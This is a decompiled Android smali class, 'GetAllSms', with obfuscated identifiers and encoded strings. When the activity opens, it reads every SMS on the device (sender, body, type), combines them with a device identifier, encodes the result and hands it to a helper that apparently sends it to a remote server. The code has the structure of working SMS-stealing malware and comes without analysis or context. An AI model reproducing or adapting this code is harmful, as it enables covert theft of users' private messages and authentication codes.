.class public Lcompse/refact/st/upsssss/GetAllSms;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field sdfsdfsdfsdf:Lcompse/refact/st/upsssss/serfwefewfwefewef;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/GetAllSms;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v0, Lcompse/refact/st/upsssss/serfwefewfwefewef;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/serfwefewfwefewef;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/GetAllSms;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    return-void
.end method

.method private synthetic fsafsdfsfsdfsfsdfsd()V
    .locals 13

    const/4 v2, 0x0

    const/4 v6, 0x0

    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    const-string v1, "[v[v[v[v[\u000f<\u000fQ\u0014\u0018/\u00053\u0003%[v[v[v[v[v[v[v[|K"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    const-string v0, "6\u0015;\u000e0\u0014!@zU&\u0017&"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/GetAllSms;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v4

    invoke-interface {v4}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v6

    move v3, v6

    :goto_0
    invoke-interface {v4}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    const-string v0, ">\u001e8\u0008"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v0, "4\u001e1\u00080\t&"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v7

    const-string v0, "type"

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v4, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    packed-switch v0, :pswitch_data_0

    move-object v0, v2

    :goto_1
    move-object v1, v0

    move-object v0, p0

    :goto_2
    invoke-virtual {v0}, Lcompse/refact/st/upsssss/GetAllSms;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v8, "\u0000(\u0019"

    invoke-static {v8}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v8, p0, Lcompse/refact/st/upsssss/GetAllSms;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v6, v0}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v9, "\u001d3\u0016r\u00014\u0001"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "\nh"

    invoke-static {v10}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v6, v10}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v10, p0, Lcompse/refact/st/upsssss/GetAllSms;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v12, p0, Lcompse/refact/st/upsssss/GetAllSms;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v12, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v6, v12}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "\rV!4\u001e2\u0014|?)\u001c>\u0014.Kq\\qQ"

    invoke-static {v12}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v11, "up\u0018\u001f&\t4\u001d0Z\u0001\u0003%\u001foWxWu"

    invoke-static {v11}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v7, "QV<9\u0002/\u0010;\u0014|33\u0015%Kq\\qQ"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v5, ")A)"

    invoke-static {v5}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v10, v1}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    add-int/lit8 v0, v3, 0x1

    invoke-virtual {v8, v9, v1}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move v3, v0

    goto/16 :goto_0

    :pswitch_0
    const-string v0, "8\u00123\u0013)"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    move-object v0, p0

    goto/16 :goto_2

    :pswitch_1
    const-string v0, ")\u00104\u0001"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    move-object v0, p0

    goto/16 :goto_2

    :pswitch_2
    const-string v0, "5\u000e0\u001a%"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_1

    :cond_0
    return-void

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-direct {p0}, Lcompse/refact/st/upsssss/GetAllSms;->fsafsdfsfsdfsfsdfsd()V

    return-void
.end method
